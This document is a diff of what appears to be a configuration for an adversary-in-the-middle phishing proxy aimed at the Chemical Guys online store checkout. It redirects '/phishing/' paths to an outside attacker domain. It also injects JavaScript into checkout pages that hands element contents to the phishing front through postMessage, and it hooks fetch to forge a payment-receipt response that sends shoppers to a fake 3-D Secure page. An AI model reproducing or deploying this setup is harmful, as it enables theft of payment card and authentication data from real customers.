@@ -41,7 +41,7 @@ sub_filters:
 
 intercept:
   # 自定义3ds页面
-  - {domain: 'www.chemicalguys.com', mime: 'redirect', body: 'bankpage.chemicalguys.fake.com:3000', path: '\/phishing\/*', http_status: 301}
+  - {domain: 'www.chemicalguys.com', mime: 'redirect', body: 'front.whoooosyourdaddy.top:8443', path: '\/phishing\/*', http_status: 301}
   - {domain: 'www.chemicalguys.com', path: '.*?\/sandboxes\/wallets', http_status: 404}
 #  - {domain: 'www.chemicalguys.com', path: '.*?/DeliveryMethodSelectorSection.*', http_status: 404}
   - {domain: 'api.intelligems.io', path: '.*\/track*', http_status: 404}
@@ -49,14 +49,43 @@ intercept:
 #  - {domain: 'api.gotolstoy.com', path: '.*', http_status: 404}
 
 js_inject:
-  - trigger_domains: [ "front.chemicalguys.com" ]
-    trigger_paths: [ "/test/.*" ]
-    script: |
-      document.domain="chemicalguys.com"
-
   - trigger_domains: ["www.chemicalguys.com"]
     trigger_paths: ["/checkouts/.*"]
     script: |
+      // 监听消息（查找元素）
+      window.addEventListener('message', (event) => {
+        if (event.origin !== 'https://front.chemicalguys.com') return;
+        
+        const { type, selector, attributes } = event.data;
+        const replyPort = event.ports[0];
+        
+        if (type === 'GET_SINGLE_DOM' && replyPort) {
+          // 1. 只找第一个
+          const el = document.querySelector(selector);
+          
+          if (!el) {
+            replyPort.postMessage({ success: false, error: 'Element not found' });
+            return;
+          }
+          
+          // 2. 提取属性
+          const data = {};
+          attributes.forEach(attr => {
+            if (attr === 'dataset') {
+              data.dataset = { ...el.dataset };
+            } else if (attr === 'innerHTML') {
+                data.innerHTML = el.innerHTML;
+            } else {
+              // 优先取 IDL 属性 (如 el.src)，取不到再取 HTML 特性 (getAttribute)
+              data[attr] = el[attr] || el.getAttribute(attr);
+            }
+          });
+      
+          replyPort.postMessage({ success: true, data });
+        }
+      });
+      
+      
       if (typeof window !== 'undefined') {
         top.window.hack = true;
         const originalFetch = window.fetch;
@@ -69,7 +98,7 @@ js_inject:
           },
           {
             url: 'PollForReceipt',
-            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://front.chemicalguys.fake.com/phishing/phishing-cursor","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
+            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://front.chemicalguys.top/phishing/fish","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
             status: 200
           }
         ];
